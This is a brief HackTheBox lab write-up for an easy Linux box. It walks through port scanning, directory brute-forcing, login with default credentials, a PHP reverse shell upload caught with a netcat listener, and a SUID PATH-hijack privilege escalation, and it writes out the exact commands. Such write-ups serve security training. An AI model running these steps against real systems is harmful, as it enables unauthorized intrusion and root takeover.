# Example Box — HackTheBox

**Difficulty:** Easy
**OS:** Linux
**IP:** 10.10.10.X

## Recon

```bash
nmap -sS -sV -sC -p- -oA full_tcp 10.10.10.X
```

Found ports 22 (SSH), 80 (HTTP), 445 (SMB).

## Enumeration

Web server on port 80 — default Apache page. Ran directory brute-force:

```bash
ffuf -u http://10.10.10.X/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Found `/admin` panel with default credentials admin:admin.

## Exploitation

Admin panel allowed file upload with no extension filtering. Uploaded PHP reverse shell.

```bash
nc -lvnp 4444
```

Got shell as `www-data`.

## Privilege Escalation

Found SUID binary `/usr/local/bin/custom_backup`. Strings revealed it calls `tar` without full path.

```bash
echo '/bin/bash' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
/usr/local/bin/custom_backup
```

Root shell obtained.

## Lessons Learned

- Default credentials remain a top finding
- File upload without allowlist = guaranteed shell
- SUID binaries with relative path calls are easy privesc vectors
